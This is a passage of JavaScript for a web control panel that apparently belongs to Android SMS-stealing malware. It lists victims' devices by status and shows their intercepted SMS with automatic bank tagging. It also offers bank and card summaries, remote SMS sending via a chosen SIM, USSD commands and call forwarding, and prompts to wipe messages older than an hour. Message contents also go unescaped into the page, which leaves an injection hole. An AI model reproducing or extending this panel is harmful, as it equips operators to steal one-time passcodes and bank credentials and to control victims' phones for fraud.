             <button id="btn-bank-summ" class="p-2 text-gray-600 hover:text-white hover:bg-green-700 rounded shrink-0 border" title="Bank Summary"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></button>
             <button id="btn-adm-set" class="p-2 text-gray-600 hover:text-white hover:bg-purple-600 rounded shrink-0 border" title="Admin Settings"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg></button>
             <button id="btn-del-off" class="p-2 text-red-400 hover:text-white hover:bg-red-500 rounded shrink-0 border border-red-100" title="Delete Offline"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
             <button id="btn-logout" class="p-2 text-gray-600 hover:text-white hover:bg-red-500 rounded shrink-0 border border-red-100" title="Logout"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" /></svg></button>
           </div>
        </div>

        <div id="grid" class="flex-1 overflow-y-auto p-4 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4 pb-20 content-start"></div>
      </div>
    `;

    const grid = document.getElementById('grid');
    
    document.getElementById('btn-glob-sms').onclick = () => { state.targetUser = null; state.currentScreen = 'SMS_VIEW'; renderApp(); };
    document.getElementById('btn-glob-data').onclick = () => { state.currentScreen = 'GLOBAL_DATA'; renderApp(); };
    document.getElementById('btn-bank-summ').onclick = () => { state.currentScreen = 'BANK_SUMMARY'; renderApp(); };
    
    document.getElementById('btn-adm-set').onclick = async () => {
        const num = await FirebaseService.getAdminNumber();
        const newNum = prompt("Update Admin Number:", num);
        if(newNum !== null) { await FirebaseService.updateAdminNumber(newNum); Utils.showToast("Updated"); }
    };

    const showCleanupModal = (users, type = 'auto') => {
        modalLayer.innerHTML = `
        <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
          <div class="bg-white rounded-xl shadow-2xl p-6 w-full max-w-sm">
             <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-6 h-6 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
             </div>
             <h3 class="text-lg font-bold text-gray-900 text-center mb-2">Automated Cleanup</h3>
             <p className="text-sm text-gray-500 text-center mb-6">Found <span class="font-bold text-gray-800">${users.length}</span> users offline for > 72h.</p>
             <div class="flex space-x-3">
                <button id="cln-ignore" class="flex-1 py-2 text-gray-600 hover:bg-gray-100 rounded-lg font-medium transition-colors">Ignore</button>
                <button id="cln-del" class="flex-1 py-2 bg-red-600 text-white rounded-lg font-medium hover:bg-red-700 shadow-sm transition-colors">Delete All</button>
             </div>
          </div>
        </div>`;
        document.getElementById('cln-ignore').onclick = () => {
             if(type === 'auto') localStorage.setItem('suppress_offline_cleanup_v2', (Date.now() + 86400000).toString());
             modalLayer.innerHTML = '';
        };
        document.getElementById('cln-del').onclick = () => {
             FirebaseService.deleteOfflineUsers(users.map(u => u.userId));
             modalLayer.innerHTML = '';
        };
    };

    document.getElementById('btn-del-off').onclick = () => {
        const offIds = state.users.filter(u => u.Status === 'Offline').map(u => u.userId);
        if(offIds.length > 0) {
            // Using Custom Modal for Manual Trigger too
             modalLayer.innerHTML = `
            <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
              <div class="bg-white rounded-xl shadow-2xl p-6 w-full max-w-sm">
                 <h3 class="text-lg font-bold text-gray-900 text-center mb-2">Delete Offline Users?</h3>
                 <p class="text-sm text-gray-500 text-center mb-6">Are you sure you want to delete <span class="font-bold">${offIds.length}</span> offline users?</p>
                 <div class="flex space-x-3">
                    <button onclick="document.getElementById('modal-layer').innerHTML=''" class="flex-1 py-2 text-gray-600 hover:bg-gray-100 rounded-lg font-medium">Cancel</button>
                    <button id="confirm-del-off" class="flex-1 py-2 bg-red-600 text-white rounded-lg font-medium hover:bg-red-700">Delete</button>
                 </div>
              </div>
            </div>`;
            document.getElementById('confirm-del-off').onclick = () => {
                FirebaseService.deleteOfflineUsers(offIds);
                modalLayer.innerHTML = '';
            };
        } else {
            Utils.showToast("No offline users found");
        }
    };

    document.getElementById('btn-logout').onclick = () => {
        if(confirm("Logout?")) { localStorage.removeItem('panel_access_token'); window.location.reload(); }
    };

    let prevUserStatus = new Map();

    // Persistent Listeners for Home
    state.homeSubscription = () => {}; // Placeholder
    
    const unsub1 = FirebaseService.subscribeToNotification(msg => {
        const bar = document.getElementById('notif-bar');
        const txt = document.getElementById('notif-text');
        if(bar && txt) {
            if(msg) { bar.classList.remove('hidden'); txt.textContent = msg; }
            else { bar.classList.add('hidden'); }
        }
    });

    const unsub2 = FirebaseService.subscribeToUsers(data => {
        // Notification Logic
        if (state.notificationsEnabled && prevUserStatus.size > 0) {
            data.forEach(u => {
                const prev = prevUserStatus.get(u.userId);
                if (prev && prev === 'Online' && u.Status === 'Offline') {
                    Utils.sendNotification('Alert', `${u.Brand} went Offline`);
                }
            });
        }
        prevUserStatus = new Map(data.map(u => [u.userId, u.Status]));
        state.users = data;
        
        // Auto Cleanup Check (72h) - Corrected to use timestamp
        if(!state.hasCheckedOfflineCleanup && !localStorage.getItem('suppress_offline_cleanup_v2')) {
            const now = Date.now();
            const stale = data.filter(u => {
                if (u.Status !== 'Offline') return false;
                const lastActive = u.timestamp || 0; // Fix: use timestamp
                return lastActive > 0 && (now - lastActive > 72*3600*1000);
            });

            if(stale.length > 0) {
                showCleanupModal(stale, 'auto');
            }
            state.hasCheckedOfflineCleanup = true;
        }

        renderGrid();
    });
    
    // Store unsubs to allow clearing on logout, though we keep them active during navigation
    state.homeSubscription = () => { unsub1(); unsub2(); };

    const renderGrid = () => {
        const q = state.homeSearch.toLowerCase();
        const f = state.homeFilter;
        const filtered = state.users.filter(u => {
            const matches = (u.Brand||'').toLowerCase().includes(q) || (u.DeviceId||'').toLowerCase().includes(q);
            return matches && (f === 'All' || u.Status === f);
        }).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));

        document.getElementById('stats-txt').innerText = `${state.users.filter(u=>u.Status==='Online').length} Online / ${state.users.length} Total`;
        
        grid.innerHTML = filtered.map(u => `
          <div class="bg-white rounded-xl shadow-sm border border-gray-200 hover:shadow-md transition-all flex flex-col min-h-[160px]">
             <div class="h-1.5 w-full ${u.Status==='Online'?'bg-green-500':'bg-gray-200'} rounded-t-xl"></div>
             <div class="p-4 flex-1 flex flex-col">
                <div class="flex justify-between items-start mb-2">
                   <div class="flex-1 pr-2 min-w-0">
                      <h3 class="font-bold text-gray-900 truncate" title="${u.Brand}">${u.Brand||'Unknown'}</h3>
                      <div class="flex items-center gap-1 cursor-pointer hover:text-blue-500" onclick="navigator.clipboard.writeText('${u.DeviceId}')">
                         <p class="text-xs text-gray-500 font-mono mt-1 truncate">${u.DeviceId}</p>
                         <svg class="w-3 h-3 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                      </div>
                   </div>
                   <div class="flex flex-col items-end gap-1 shrink-0">
                       <span class="text-[10px] px-2 py-0.5 rounded-full uppercase font-bold ${u.Status==='Online'?'bg-green-100 text-green-700':'bg-gray-100 text-gray-500'} flex items-center gap-1">
                          ${u.Status==='Online' ? '<span class="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>' : ''} ${u.Status}
                       </span>
                       ${u.Status==='Offline' ? `<button class="text-gray-300 hover:text-red-500" onclick="window.delUser('${u.userId}')"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>` : ''}
                   </div>
                </div>
                <div class="mt-auto pt-2 flex justify-between items-end">
                   <span class="text-[10px] text-gray-400">${Utils.timeAgo(u.timestamp)}</span>
                   <div class="flex gap-2">
                      <button class="px-3 py-1.5 bg-gray-50 hover:bg-app-green hover:text-white text-gray-600 rounded text-xs font-bold transition-colors btn-sms" data-id="${u.userId}">SMS</button>
                      <button class="px-3 py-1.5 bg-gray-50 hover:bg-blue-600 hover:text-white text-gray-600 rounded text-xs font-bold transition-colors btn-data" data-id="${u.userId}">Data</button>
                   </div>
                </div>
             </div>
          </div>
        `).join('') || `<div class="col-span-full text-center text-gray-400 py-10 border-2 border-dashed rounded-xl">No devices match your filter</div>`;

        grid.querySelectorAll('.btn-sms').forEach(b => b.onclick = () => { state.targetUser = state.users.find(u=>u.userId===b.dataset.id); state.currentScreen = 'SMS_VIEW'; renderApp(); });
        grid.querySelectorAll('.btn-data').forEach(b => b.onclick = () => { state.targetUser = state.users.find(u=>u.userId===b.dataset.id); state.currentScreen = 'DATA_VIEW'; renderApp(); });
    };

    window.delUser = (id) => { if(confirm("Delete User?")) FirebaseService.deleteOfflineUsers([id]); };
    document.getElementById('search-dev').oninput = e => { state.homeSearch = e.target.value; renderGrid(); };
    document.getElementById('filter-stat').onchange = e => { state.homeFilter = e.target.value; renderGrid(); };
};

// ==========================================
// 7. SCREEN: SMS VIEWER
// ==========================================
const renderSmsViewer = (container) => {
    clearDetailSubscriptions();
    const isGlobal = !state.targetUser;
    
    container.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50 overflow-hidden">
         <header class="bg-white border-b px-4 py-3 flex justify-between items-center sticky top-0 z-20 shadow-sm flex-none">
            <div class="flex items-center space-x-3 overflow-hidden">
               <button id="btn-back" class="p-2 rounded-full hover:bg-gray-100 text-gray-600"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button>
               <div>
                  <h1 class="font-bold text-lg text-gray-900 truncate max-w-[150px] md:max-w-md">${isGlobal ? "Global Messages" : state.targetUser.Brand}</h1>
                  <p class="text-xs text-gray-500">${isGlobal ? "All Users" : state.targetUser.DeviceId}</p>
               </div>
            </div>
            <button id="btn-del-all" class="p-2 text-red-500 hover:bg-red-50 rounded" title="Delete All"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
         </header>
         
         <div class="bg-white px-4 py-2 border-b flex-none">
            <input id="sms-search" class="w-full border rounded-lg py-2 px-3 text-sm focus:outline-none focus:border-app-green" placeholder="Search message or sender..." value="${state.smsSearch}">
         </div>
         
         <div id="bank-chips" class="bg-white border-b px-4 py-2 overflow-x-auto whitespace-nowrap scrollbar-hide flex gap-2 flex-none min-h-[50px] items-center"></div>
         
         <div id="sms-list" class="flex-1 overflow-y-auto p-3 space-y-3 pb-20">
            <div class="flex justify-center p-10"><div class="animate-spin rounded-full h-8 w-8 border-b-2 border-app-green"></div></div>
         </div>
      </div>
    `;

    document.getElementById('btn-back').onclick = () => { state.currentScreen = 'HOME'; renderApp(); };
    document.getElementById('btn-del-all').onclick = async () => {
        // Updated: Custom Modal for Delete All
        modalLayer.innerHTML = `
        <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
          <div class="bg-white rounded-xl shadow-2xl p-6 w-full max-w-sm">
             <h3 class="text-lg font-bold text-gray-900 text-center mb-2">Delete All Messages?</h3>
             <p class="text-sm text-gray-500 text-center mb-6">This action is irreversible and will wipe all messages.</p>
             <div class="flex space-x-3">
                <button onclick="document.getElementById('modal-layer').innerHTML=''" class="flex-1 py-2 text-gray-600 hover:bg-gray-100 rounded-lg font-medium">Cancel</button>
                <button id="confirm-del-all-sms" class="flex-1 py-2 bg-red-600 text-white rounded-lg font-medium hover:bg-red-700">Delete</button>
             </div>
          </div>
        </div>`;
        document.getElementById('confirm-del-all-sms').onclick = async () => {
            if(isGlobal) await FirebaseService.deleteAllGlobalSMS(); else await FirebaseService.deleteAllSMS(state.targetUser.userId);
            modalLayer.innerHTML = '';
        };
    };

    const listEl = document.getElementById('sms-list');
    const chipEl = document.getElementById('bank-chips');

    const renderList = () => {
        const q = state.smsSearch.toLowerCase();
        const b = state.smsFilterBank;
        const filtered = state.smsList.filter(s => {
            const body = (s.body||'').toLowerCase();
            const sender = (s.sender||'').toLowerCase();
            const banks = Utils.detectBanks(s.sender + ' ' + s.body);
            return (body.includes(q) || sender.includes(q)) && (!b || banks.includes(b));
        });

        // Bank Chips Logic
        const stats = {};
        state.smsList.forEach(s => Utils.detectBanks(s.sender + ' ' + s.body).forEach(bk => stats[bk] = (stats[bk]||0)+1));
        chipEl.innerHTML = `<button class="px-3 py-1 rounded-full text-xs font-bold border transition-colors ${!state.smsFilterBank?'bg-app-green text-white border-app-green':'bg-white text-gray-600 border-gray-300'}" id="chip-all">All</button>` +
            Object.entries(stats).sort((a,b)=>b[1]-a[1]).map(([name, count]) => `
                <button class="px-3 py-1 rounded-full text-xs font-bold border transition-colors flex items-center gap-1 ${state.smsFilterBank===name?'bg-app-green text-white border-app-green':'bg-white text-gray-600 border-gray-300'} chip-bank" data-name="${name}">
                   ${name} <span class="bg-black/10 px-1 rounded text-[10px]">${count}</span>
                </button>
            `).join('');
        
        document.getElementById('chip-all').onclick = () => { state.smsFilterBank = null; renderList(); };
        chipEl.querySelectorAll('.chip-bank').forEach(b => b.onclick = () => { state.smsFilterBank = state.smsFilterBank === b.dataset.name ? null : b.dataset.name; renderList(); });

        if(filtered.length === 0) { listEl.innerHTML = `<div class="text-center text-gray-400 py-10">No messages found</div>`; return; }

        const highlight = (text) => {
            if(!q) return text;
            return text.replace(new RegExp(`(${q})`, 'gi'), '<span class="bg-yellow-200 text-black px-0.5 rounded">$1</span>');
        };

        const limit = isGlobal ? state.smsVisibleCount : filtered.length;
        
        listEl.innerHTML = filtered.slice(0, limit).map(sms => `
           <div class="bg-white rounded-lg shadow-sm p-3 relative group hover:shadow-md border border-gray-100 transition-all cursor-pointer" onclick="window.viewSms(this)">
              <div class="flex justify-between items-baseline mb-1">
                 <h3 class="font-bold text-gray-800 text-sm truncate pr-8">${highlight(sms.sender)}</h3>
                 <span class="text-[10px] text-gray-400 shrink-0">${new Date(sms.timestamp).toLocaleDateString()} ${new Date(sms.timestamp).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
              </div>
              <p class="text-gray-600 text-xs line-clamp-2">${highlight(sms.body)}</p>
              <div class="flex gap-1 mt-2 flex-wrap">
                 ${Utils.detectBanks(sms.sender + ' ' + sms.body).map(b => `<span class="text-[9px] bg-blue-50 text-blue-600 px-1.5 py-0.5 rounded border border-blue-100 font-bold">${b}</span>`).join('')}
              </div>
              ${isGlobal ? `<div class="text-[9px] text-gray-400 mt-1 font-mono">${sms.userId}</div>` : ''}
              <button class="absolute top-2 right-2 text-gray-300 hover:text-red-500 p-1 opacity-100 sm:opacity-0 sm:group-hover:opacity-100 transition-opacity" onclick="event.stopPropagation(); window.delSms('${sms.userId}','${sms.key}')">
                 <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
              </button>
              <div class="hidden-payload hidden">${JSON.stringify(sms).replace(/"/g, '&quot;')}</div>
           </div>
        `).join('') + (isGlobal && filtered.length > limit ? `<button id="load-more" class="w-full py-2 text-gray-500 text-sm font-bold bg-gray-100 rounded hover:bg-gray-200">Load More</button>` : '');
        
        if(document.getElementById('load-more')) {
            document.getElementById('load-more').onclick = () => { state.smsVisibleCount += 50; renderList(); };
        }
    };

    window.delSms = (uid, key) => { if(confirm("Delete message?")) FirebaseService.deleteSMS(uid, key); };
    
    window.viewSms = (el) => {
        const sms = JSON.parse(el.querySelector('.hidden-payload').textContent);
        modalLayer.innerHTML = `
           <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn" onclick="this.remove()">
              <div class="bg-white rounded-xl shadow-xl w-full max-w-md overflow-hidden relative" onclick="event.stopPropagation()">
                 <div class="bg-app-green px-4 py-3 flex justify-between items-center text-white">
                    <h3 class="font-bold truncate pr-4">${sms.sender}</h3>
                    <button onclick="this.closest('.fixed').remove()">✕</button>
                 </div>
                 <div class="p-6">
                    <div class="bg-gray-50 p-4 rounded border border-gray-100 text-sm text-gray-800 whitespace-pre-wrap leading-relaxed max-h-60 overflow-y-auto">${sms.body}</div>
                    <div class="mt-4 grid grid-cols-2 gap-4 text-xs text-gray-500">
                        <div><span class="font-bold block uppercase">Time</span>${new Date(sms.timestamp).toLocaleString()}</div>
                        <div><span class="font-bold block uppercase">Received</span>${sms.receivedDate}</div>
                        <div><span class="font-bold block uppercase">User ID</span><span class="font-mono bg-gray-100 px-1 rounded truncate block">${sms.userId}</span></div>
                    </div>
                 </div>
              </div>
           </div>
        `;
    };

    document.getElementById('sms-search').oninput = e => { state.smsSearch = e.target.value; renderList(); };

    // Data Loading
    const processData = (data) => {
        state.smsList = data;
        renderList();
        // Auto Cleanup (1 Hour) - Updated UI
        if(!state.hasCheckedSmsCleanup && !isGlobal && !localStorage.getItem('suppress_sms_cleanup_until')) {
            const now = Date.now();
            const old = data.filter(m => now - m.timestamp > 3600000);
            if(old.length > 0) {
               modalLayer.innerHTML = `
               <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
                 <div class="bg-white rounded-xl shadow-2xl p-6 w-full max-w-sm">
                    <div class="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-6 h-6 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                    </div>
                    <h3 class="text-lg font-bold text-gray-900 text-center mb-2">Clean Old Messages</h3>
                    <p class="text-sm text-gray-500 text-center mb-6">Found <span class="font-bold text-gray-800">${old.length}</span> messages older than 1 hour.</p>
                    <div class="flex space-x-3">
                        <button id="sms-clean-keep" class="flex-1 py-2 text-gray-600 hover:bg-gray-100 rounded-lg font-medium transition-colors">Keep</button>
                        <button id="sms-clean-del" class="flex-1 py-2 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 shadow-sm transition-colors">Clean Now</button>
                    </div>
                 </div>
               </div>`;
               document.getElementById('sms-clean-keep').onclick = () => {
                   localStorage.setItem('suppress_sms_cleanup_until', Date.now() + 86400000);
                   modalLayer.innerHTML = '';
               };
               document.getElementById('sms-clean-del').onclick = () => {
                   FirebaseService.deleteBatchSMS(old);
                   modalLayer.innerHTML = '';
               };
            }
            state.hasCheckedSmsCleanup = true;
        }
    };

    if (isGlobal) {
        FirebaseService.fetchGlobalSMS().then(processData);
    } else {
        state.subscriptions.push(FirebaseService.subscribeToSMS(state.targetUser.userId, processData));
    }
};

// ==========================================
// 8. SCREEN: USER DATA VIEWER (ACTIONS)
// ==========================================
const renderUserDataViewer = (container) => {
    clearDetailSubscriptions();
    const t = state.targetUser;
    let infoData = { deviceInfo: t };
    let activeTab = 'ACTIONS';

    container.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50 overflow-hidden">
         <header class="bg-white border-b px-4 py-3 flex justify-between items-center sticky top-0 z-10 shadow-sm flex-none">
            <div class="flex items-center space-x-3">
               <button id="btn-back" class="p-2 rounded-full hover:bg-gray-100"><svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button>
               <div><h1 class="font-bold text-lg leading-tight">${t.Brand}</h1><span class="text-xs text-gray-500 font-mono">${t.DeviceId}</span></div>
            </div>
            <button id="btn-check" class="bg-green-50 text-green-700 px-3 py-1 rounded-full text-xs font-bold border border-green-200 hover:bg-green-100">Mark Checked</button>
         </header>
         <div class="flex-1 overflow-y-auto p-4 max-w-5xl mx-auto w-full space-y-4">
            <div id="sim-card" class="bg-white rounded-xl shadow-sm border border-gray-100 p-4 grid grid-cols-1 md:grid-cols-2 gap-4">
               <div class="animate-pulse h-10 bg-gray-100 rounded"></div><div class="animate-pulse h-10 bg-gray-100 rounded"></div>
            </div>
            <div class="flex bg-gray-200/50 p-1 rounded-xl">
               <button class="tab flex-1 py-2 text-sm font-bold rounded-lg transition-all" data-tab="ACTIONS">ACTIONS</button>
               <button class="tab flex-1 py-2 text-sm font-bold rounded-lg transition-all" data-tab="DATA">DATA</button>
               <button class="tab flex-1 py-2 text-sm font-bold rounded-lg transition-all" data-tab="CARDS">CARDS</button>
            </div>
            <div id="tab-content" class="pb-10"></div>
         </div>
      </div>
    `;

    document.getElementById('btn-back').onclick = () => { state.currentScreen = 'HOME'; renderApp(); };
    document.getElementById('btn-check').onclick = () => { FirebaseService.markUserAsChecked(t.userId); Utils.showToast("Marked Checked"); };

    const createProfessionalViewer = (data) => {
        const wrapper = document.createElement('div');
        wrapper.className = "relative group";

        const copyBtn = document.createElement('button');
        copyBtn.className = "absolute right-0 -top-2 p-1.5 text-gray-400 hover:text-gray-600 rounded opacity-0 group-hover:opacity-100 transition-opacity focus:opacity-100 focus:outline-none z-10";
        copyBtn.title = "Copy JSON";
        copyBtn.innerHTML = `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>`;
        
        copyBtn.onclick = (e) => {
            e.stopPropagation();
            const text = (typeof data === 'string') ? data : JSON.stringify(data, null, 2);
            navigator.clipboard.writeText(text);
            copyBtn.innerHTML = `<svg class="w-4 h-4 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg>`;
            setTimeout(() => {
                copyBtn.innerHTML = `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>`;
            }, 2000);
        };
        wrapper.appendChild(copyBtn);

        const contentDiv = document.createElement('div');
        contentDiv.className = "text-sm text-gray-700";

        const isObj = typeof data === 'object' && data !== null && !Array.isArray(data);
        const hasData = isObj ? Object.keys(data).length > 0 : !!data;

        if (!hasData) {
            contentDiv.innerHTML = `<div class="text-xs text-gray-400 italic">No Data</div>`;
        } else if (!isObj) {
            const valDiv = document.createElement('div');
            valDiv.className = "font-mono p-2 bg-gray-50 rounded break-all border border-gray-100";
            valDiv.textContent = String(data);
            contentDiv.appendChild(valDiv);
        } else {
            const listDiv = document.createElement('div');
            listDiv.className = "flex flex-col space-y-2";
            
            Object.entries(data).forEach(([k, v]) => {
                 const row = document.createElement('div');
                 row.className = "flex flex-col sm:flex-row sm:items-baseline border-b border-gray-50 last:border-0 pb-1";
                 
                 const keyStr = k.replace(/_/g, ' ');
                 const valStr = (typeof v === 'object' && v !== null) ? JSON.stringify(v) : String(v);
                 
                 row.innerHTML = `
                     <span class="text-xs font-bold text-gray-500 uppercase tracking-wider w-full sm:w-1/3 md:w-1/4 shrink-0 mb-1 sm:mb-0">${keyStr}:</span>
                     <span class="font-mono text-gray-900 text-sm break-all w-full sm:w-2/3 md:w-3/4">${valStr}</span>
                 `;
                 listDiv.appendChild(row);
            });
            contentDiv.appendChild(listDiv);
        }

        wrapper.appendChild(contentDiv);
        return wrapper;
    };

    const renderTabs = () => {
        document.querySelectorAll('.tab').forEach(b => {
            const sel = b.dataset.tab === activeTab;
            b.className = `tab flex-1 py-2 text-sm font-bold rounded-lg transition-all focus:outline-none ${sel ? 'bg-white shadow text-gray-900' : 'text-gray-500 hover:text-gray-700'}`;
            b.onclick = () => { activeTab = b.dataset.tab; renderTabs(); };
        });

        const content = document.getElementById('tab-content');
        content.innerHTML = '';

        if (activeTab === 'ACTIONS') {
            const s = infoData.simDetails || {};
            const hasSim1 = !!(s.sim1Number || s.sim1Provider);
            const hasSim2 = !!(s.sim2Number || s.sim2Provider);

            content.innerHTML = `
               <div class="grid grid-cols-1 md:grid-cols-2 gap-4 animate-fadeIn">
                  <button id="act-sms" class="col-span-1 md:col-span-2 bg-gradient-to-r from-app-green to-teal-600 text-white p-6 rounded-xl shadow-md hover:shadow-lg transition-all flex items-center justify-center space-x-3 group transform hover:scale-[1.01]">
                     <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>
                     <div class="text-left"><span class="block font-bold text-xl">Enhanced SMS Control</span><span class="text-xs text-green-100 opacity-80">Send SMS via specific SIM</span></div>
                  </button>
                  <button id="act-ussd" class="bg-white border border-gray-200 p-6 rounded-xl shadow-sm hover:border-purple-300 transition-all flex flex-col items-center justify-center text-center space-y-2 group">
                     <div class="p-3 bg-purple-50 text-purple-600 rounded-full group-hover:bg-purple-100 transition-colors"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div>
                     <span class="font-bold text-gray-800">USSD Terminal</span>
                  </button>
                  <button id="act-call" class="bg-white border border-gray-200 p-6 rounded-xl shadow-sm hover:border-blue-300 transition-all flex flex-col items-center justify-center text-center space-y-2 group">
                     <div class="p-3 bg-blue-50 text-blue-600 rounded-full group-hover:bg-blue-100 transition-colors"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg></div>
                     <span class="font-bold text-gray-800">Call Forwarding</span>
                  </button>
               </div>
            `;

            // SMS Modal
            document.getElementById('act-sms').onclick = () => {
                let slot = hasSim1 ? 0 : 1;
                modalLayer.innerHTML = `
                  <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
                    <div class="bg-white rounded-2xl w-full max-w-sm overflow-hidden">
